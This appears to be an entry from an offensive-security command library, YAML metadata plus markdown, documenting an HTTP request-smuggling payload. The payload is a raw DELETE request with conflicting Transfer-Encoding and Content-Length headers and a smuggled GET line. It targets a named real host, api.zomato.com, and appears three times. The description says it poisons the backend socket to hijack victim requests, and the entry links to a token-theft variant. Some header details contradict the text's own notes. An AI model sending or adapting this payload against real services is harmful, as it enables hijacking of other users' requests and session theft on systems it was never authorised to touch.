---
data: |-
  DELETE / HTTP/1.1
  Transfer-Encoding: chunked
  Host: api.zomato.com
  Content-Length: 51
  User-Agent: Treasure/6.7
  0
  GET /some/other/endpoint HTTP/1.1
  X-Ignore: X[STOP]
tags:
  - http-request-smuggling
type: command
executor: bash
platforms:
  - Web
id: dffaa944-42d7-466e-889d-38f87fccbc59
created_at: '2025-12-11T06:10:24.443Z'
updated_at: '2025-12-11T06:10:24.443Z'
verified: false
validated: true
submitted: true
---
# smuggle-request-basic

## Command

```bash
DELETE / HTTP/1.1
Transfer-Encoding: chunked
Host: api.zomato.com
Content-Length: 51
User-Agent: Treasure/6.7
0
GET /some/other/endpoint HTTP/1.1
X-Ignore: X[STOP]
```

## Description

Smuggles a request to poison the backend socket and hijack victim requests by prepending data, used to demonstrate basic smuggling and hijacking.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `0` | Chunk size indicating end of chunked body | Yes |
| `Content-Length` | 51 (bytes forwarded by frontend) | Yes |
| `Transfer-Encoding` | chunked (malformed with tab, but shown without in example) | Yes |

## Examples

### Basic Usage

```bash
DELETE / HTTP/1.1
Transfer-Encoding: chunked
Host: api.zomato.com
Content-Length: 51
User-Agent: Treasure/6.7
0
GET /some/other/endpoint HTTP/1.1
X-Ignore: X[STOP]
```

## Expected Output

Victim request is hijacked and redirected to /some/other/endpoint.

## Related

- [[procedures/Craft-Smuggling-Payload-for-Request-Hijacking]]
- [[commands/smuggle-request-token-theft]]
